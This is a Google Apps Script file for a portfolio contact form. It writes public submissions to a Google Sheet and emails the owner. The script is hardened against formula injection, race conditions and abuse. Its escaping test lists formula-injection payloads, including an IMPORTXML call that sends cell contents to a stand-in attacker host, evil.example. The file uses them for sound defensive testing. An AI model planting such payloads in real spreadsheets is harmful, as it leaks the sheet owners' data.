/**
 * Google Apps Script — Contact Form Response Collector
 *
 * Receives contact-form submissions from the portfolio, appends them to a
 * Google Sheet, and emails the owner.
 *
 * This endpoint is PUBLIC (anyone can POST to it), so everything below is
 * written on the assumption that the payload is hostile. Four things this
 * script previously got wrong, and what replaced them:
 *
 *   1. Formula injection. Values were written to the sheet verbatim, so a
 *      message beginning "=", "+", "-" or "@" became a live formula the
 *      moment the sheet was opened — able to call IMPORTXML/HYPERLINK and
 *      exfiltrate neighbouring cells to an attacker's server. Every value
 *      now goes through sanitizeForSheet() and lands as inert text.
 *
 *   2. Concurrent writes. getLastRow()/appendRow() without a lock lets two
 *      simultaneous submissions read the same row number and interleave.
 *      All sheet access now runs inside a LockService critical section.
 *
 *   3. Wrong sheet. getActiveSpreadsheet().getActiveSheet() writes to
 *      whichever tab happens to be active, which is whatever the owner last
 *      clicked. The target is now a configured spreadsheet ID and sheet name.
 *
 *   4. A global rate limiter. One visitor hitting the throttle blocked every
 *      other visitor for the whole window — a denial-of-service anyone could
 *      trigger by double-clicking. Limits are now per-submitter, with the
 *      global counter demoted to a high circuit breaker.
 *
 * CONFIGURATION lives in Script Properties, not in this file, so a fork of
 * the repository never carries someone else's sheet id or secrets:
 *
 *   Extensions → Apps Script → Project Settings → Script Properties
 *
 *     SPREADSHEET_ID    required. The id in the sheet's URL:
 *                       docs.google.com/spreadsheets/d/<THIS PART>/edit
 *     SHEET_NAME        optional, default "Responses". Created if missing.
 *     OWNER_EMAIL       required. Where notifications are sent.
 *     TURNSTILE_SECRET  optional. When set, every submission must carry a
 *                       valid Cloudflare Turnstile token. See README.
 */

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------

var DEFAULT_SHEET_NAME = 'Responses';
var HEADERS = ['Timestamp', 'Name', 'Email', 'Subject', 'Message', 'Source'];

// Per-submitter limits. These are the ones that actually protect the form.
var MIN_SECONDS_BETWEEN_SUBMISSIONS = 15;   // per submitter, not globally
var MAX_SUBMISSIONS_PER_HOUR = 5;           // per submitter

// A circuit breaker for the endpoint as a whole. Deliberately far above what
// any individual is allowed, so a single visitor cannot trip it for everyone.
var GLOBAL_MAX_SUBMISSIONS_PER_HOUR = 200;

// How long to wait for the sheet lock before giving up and telling the visitor
// to retry. Apps Script's own execution ceiling is well above this.
var LOCK_TIMEOUT_MS = 15000;

var FIELD_LIMITS = { name: 200, email: 200, subject: 300, message: 5000 };

function getConfig() {
  var props = PropertiesService.getScriptProperties();
  return {
    spreadsheetId: props.getProperty('SPREADSHEET_ID'),
    sheetName: props.getProperty('SHEET_NAME') || DEFAULT_SHEET_NAME,
    ownerEmail: props.getProperty('OWNER_EMAIL'),
    turnstileSecret: props.getProperty('TURNSTILE_SECRET')
  };
}

// ---------------------------------------------------------------------------
// Spreadsheet formula injection
// ---------------------------------------------------------------------------

/**
 * Makes a value inert before it reaches a cell.
 *
 * Sheets treats a cell as a formula when its first character is one of
 * = + - @, and treats a leading tab or carriage return as whitespace it will
 * strip before applying that same rule — so those have to be caught too
 * (this is the CSV/spreadsheet-injection rule from OWASP). Prefixing a single
 * quote tells Sheets "this is text": the quote is not part of the stored
 * value and is not displayed, so the owner still reads exactly what was sent.
 *
 * Control characters are dropped as well, so a payload cannot smuggle in
 * line-noise that hides the rest of the row when the sheet is read.
 */
function sanitizeForSheet(value) {
  var text = String(value == null ? '' : value);

  // Strip control characters except tab, newline and carriage return, which a
  // legitimate multi-line message may contain.
  text = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');

  if (/^[\s]*[=+\-@\t\r]/.test(text)) {
    return "'" + text;
  }
  return text;
}

// ---------------------------------------------------------------------------
// Rate limiting
// ---------------------------------------------------------------------------

/**
 * A stable, non-reversible key for one submitter.
 *
 * Apps Script web apps never see the client IP, so the submitted email is the
 * best available identity. It is hashed rather than stored, so the throttle
 * cache holds no personal data — and a truncated digest is plenty for a cache
 * key. Someone determined can of course vary the address; the honeypot,
 * the global breaker and (when configured) Turnstile cover that case.
 */
function submitterKey(email) {
  var digest = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    String(email || '').toLowerCase(),
    Utilities.Charset.UTF_8
  );
  var hex = '';
  for (var i = 0; i < 8; i++) {
    hex += ('0' + (digest[i] & 0xFF).toString(16)).slice(-2);
  }
  return hex;
}

/**
 * Returns null when the submission may proceed, or a message explaining why
 * not. Per-submitter checks come first so that a busy endpoint never reports
 * someone else's traffic as this visitor's problem.
 */
function checkRateLimit(email) {
  var cache = CacheService.getScriptCache();
  var key = submitterKey(email);

  if (cache.get('burst-' + key)) {
    return 'You just sent a message — please wait a moment before sending another.';
  }

  var mine = parseInt(cache.get('hour-' + key), 10) || 0;
  if (mine >= MAX_SUBMISSIONS_PER_HOUR) {
    return 'That is several messages from this address in the last hour. Please email me directly instead.';
  }

  // The global counter is a backstop against a broad flood, not a per-visitor
  // limit, which is why the ceiling is an order of magnitude higher.
  var total = parseInt(cache.get('global-hour-count'), 10) || 0;
  if (total >= GLOBAL_MAX_SUBMISSIONS_PER_HOUR) {
    return 'The contact form is unusually busy right now. Please try again later or email me directly.';
  }

  cache.put('burst-' + key, '1', MIN_SECONDS_BETWEEN_SUBMISSIONS);
  cache.put('hour-' + key, String(mine + 1), 3600);
  cache.put('global-hour-count', String(total + 1), 3600);
  return null;
}

// ---------------------------------------------------------------------------
// Cloudflare Turnstile (optional)
// ---------------------------------------------------------------------------

/**
 * Verifies a Turnstile token when TURNSTILE_SECRET is configured.
 *
 * Left unconfigured, this returns null and the honeypot plus the per-submitter
 * limits above are the whole defence — which is a reasonable posture for a
 * personal contact form. Setting the property switches on a real per-visitor
 * challenge without any other change to this script.
 *
 * A verification service that is down must not silently disable the check:
 * an unreachable endpoint fails closed.
 */
function verifyTurnstile(token, secret) {
  if (!secret) return null;
  if (!token) return 'Please complete the verification challenge and try again.';

  try {
    var res = UrlFetchApp.fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'post',
      payload: { secret: secret, response: token },
      muteHttpExceptions: true
    });
    var body = JSON.parse(res.getContentText());
    if (body && body.success === true) return null;
    return 'Verification failed. Please try again.';
  } catch (err) {
    return 'Verification is unavailable right now. Please try again shortly.';
  }
}

// ---------------------------------------------------------------------------
// Sheet access
// ---------------------------------------------------------------------------

/**
 * Opens the configured sheet by id and name — never "whatever tab is active".
 * Creates the tab and its header row on first use.
 */
function getSheet(config) {
  if (!config.spreadsheetId) {
    throw new Error('SPREADSHEET_ID script property is not set');
  }

  var spreadsheet = SpreadsheetApp.openById(config.spreadsheetId);
  var sheet = spreadsheet.getSheetByName(config.sheetName);
  if (!sheet) {
    sheet = spreadsheet.insertSheet(config.sheetName);
  }

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    var headerRange = sheet.getRange(1, 1, 1, HEADERS.length);
    headerRange.setFontWeight('bold');
    headerRange.setBackground('#4285f4');
    headerRange.setFontColor('#ffffff');
    sheet.setFrozenRows(1);
  }

  return sheet;
}

/**
 * Appends one submission inside a lock, so two simultaneous POSTs cannot read
 * the same last row and overwrite each other.
 *
 * setValues with the cells forced to plain text is what makes the escaping
 * above stick: appendRow would re-parse a leading "=" as a formula even after
 * the value was quoted.
 */
function appendSubmission(config, row) {
  var lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
    throw new Error('Could not acquire the sheet lock');
  }

  try {
    var sheet = getSheet(config);
    var target = sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length);
    target.setNumberFormat('@');           // plain text, for every cell in the row
    target.setValues([row]);
    SpreadsheetApp.flush();                // commit before the lock is released
  } finally {
    lock.releaseLock();
  }
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

function jsonResponse(status, message) {
  return ContentService.createTextOutput(JSON.stringify({
    'status': status,
    'message': message
  })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * Handles GET requests — a health check that reveals nothing about the
 * spreadsheet behind it. The previous version printed the spreadsheet's name
 * to anyone who loaded the URL.
 */
function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    status: 'ok',
    message: 'Contact form endpoint is active. Send submissions as POST.'
  })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * Handles POST requests — validates, rate-limits, records, notifies.
 */
function doPost(e) {
  var config = getConfig();

  try {
    if (!e || !e.postData || !e.postData.contents) {
      return jsonResponse('error', 'No submission data received.');
    }

    var data;
    try {
      data = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return jsonResponse('error', 'Could not read the submission.');
    }
    if (!data || typeof data !== 'object') {
      return jsonResponse('error', 'Could not read the submission.');
    }

    // Honeypot: real visitors never see this field. If it's filled, a bot
    // did it — claim success so it moves on, but record and send nothing.
    if (data.website) {
      return jsonResponse('success', 'Response recorded successfully!');
    }

    var name = String(data.name || '').trim().slice(0, FIELD_LIMITS.name);
    var email = String(data.email || '').trim().slice(0, FIELD_LIMITS.email);
    var subject = String(data.subject || '').trim().slice(0, FIELD_LIMITS.subject);
    var message = String(data.message || '').trim().slice(0, FIELD_LIMITS.message);

    if (!name || !message) {
      return jsonResponse('error', 'Name and message are required.');
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return jsonResponse('error', 'Please provide a valid email address.');
    }

    var challengeError = verifyTurnstile(data.turnstileToken, config.turnstileSecret);
    if (challengeError) {
      return jsonResponse('error', challengeError);
    }

    var limited = checkRateLimit(email);
    if (limited) {
      return jsonResponse('error', limited);
    }

    // "Source" is visitor-supplied and gets the same treatment as everything
    // else — it is no more trustworthy than the message body.
    var source = String(data.source || '').trim().slice(0, 100);

    appendSubmission(config, [
      new Date(),
      sanitizeForSheet(name),
      sanitizeForSheet(email),
      sanitizeForSheet(subject),
      sanitizeForSheet(message),
      sanitizeForSheet(source)
    ]);

    // Notify the owner only. The submitter's address goes in replyTo so a
    // plain "Reply" reaches them — never CC it, or the public endpoint
    // becomes a way to send mail to arbitrary addresses from this account.
    //
    // A failed notification must not fail the submission: the message is
    // already safely in the sheet by this point.
    if (config.ownerEmail) {
      try {
        MailApp.sendEmail(
          config.ownerEmail,
          'New Submission from ' + name,
          'Here are the details of the new response:\n\n' +
          'Name: ' + name + '\n' +
          'Email: ' + email + '\n' +
          'Subject: ' + (subject || 'No Subject') + '\n' +
          'Message: ' + message + '\n\n' +
          'Timestamp: ' + new Date(),
          { replyTo: email }
        );
      } catch (mailError) {
        console.error('Notification email failed: ' + mailError);
      }
    }

    return jsonResponse('success', 'Response recorded successfully!');

  } catch (error) {
    // The visitor gets a generic message; the detail goes to the Apps Script
    // log. Returning error.toString() leaked spreadsheet ids and internal
    // paths to anyone who could make the script throw.
    console.error('doPost failed: ' + error);
    return jsonResponse('error', 'Something went wrong on our side. Please try again shortly.');
  }
}

// ---------------------------------------------------------------------------
// Tests — run these from the Apps Script editor after deploying
// ---------------------------------------------------------------------------

/**
 * Verifies configuration and connectivity without writing anything.
 */
function testConfiguration() {
  var config = getConfig();
  var problems = [];

  if (!config.spreadsheetId) problems.push('SPREADSHEET_ID is not set');
  if (!config.ownerEmail) problems.push('OWNER_EMAIL is not set');

  if (config.spreadsheetId) {
    try {
      var sheet = getSheet(config);
      Logger.log('Sheet: ' + sheet.getName() + ' (' + sheet.getLastRow() + ' rows)');
    } catch (err) {
      problems.push('Cannot open the sheet: ' + err.message);
    }
  }

  Logger.log(problems.length ? 'PROBLEMS:\n  ' + problems.join('\n  ') : 'Configuration OK');
  return problems;
}

/**
 * Asserts that every spreadsheet-injection payload lands as inert text.
 * These are the exact prefixes Sheets treats as the start of a formula.
 */
function testFormulaEscaping() {
  var payloads = [
    '=IMPORTXML("https://evil.example/?d="&A1,"//a")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
    '  =HYPERLINK("https://evil.example","click")'
  ];
  var safe = ['Normal message', 'a = b in my notes', 'price: 5-3', 'user@example.com'];

  var failures = [];

  payloads.forEach(function (p) {
    var out = sanitizeForSheet(p);
    if (out.charAt(0) !== "'") failures.push('NOT ESCAPED: ' + JSON.stringify(p));
  });

  safe.forEach(function (s) {
    if (sanitizeForSheet(s) !== s) failures.push('OVER-ESCAPED: ' + JSON.stringify(s));
  });

  if (sanitizeForSheet('a\u0007b') !== 'ab') failures.push('control characters not stripped');
  if (sanitizeForSheet('line\nbreak') !== 'line\nbreak') failures.push('newlines in a message must survive');
  if (sanitizeForSheet(null) !== '') failures.push('null not handled');

  Logger.log(failures.length ? 'FAILED:\n  ' + failures.join('\n  ') : 'All escaping tests passed');
  return failures;
}

/**
 * Simulates a form submission end to end. Writes a real row — run it on a
 * test sheet, or delete the row afterwards.
 */
function testCapture() {
  var result = doPost({
    postData: {
      type: 'application/json',
      contents: JSON.stringify({
        name: 'Test User',
        email: 'test@example.com',
        subject: 'Test Subject',
        message: 'This is a test submission from the contact form',
        source: 'testCapture()'
      })
    }
  });
  Logger.log(result.getContent());
}

/**
 * Get the web app URL (useful after deployment)
 */
function getWebAppUrl() {
  var url = ScriptApp.getService().getUrl();
  Logger.log('Web App URL: ' + url);
  return url;
}
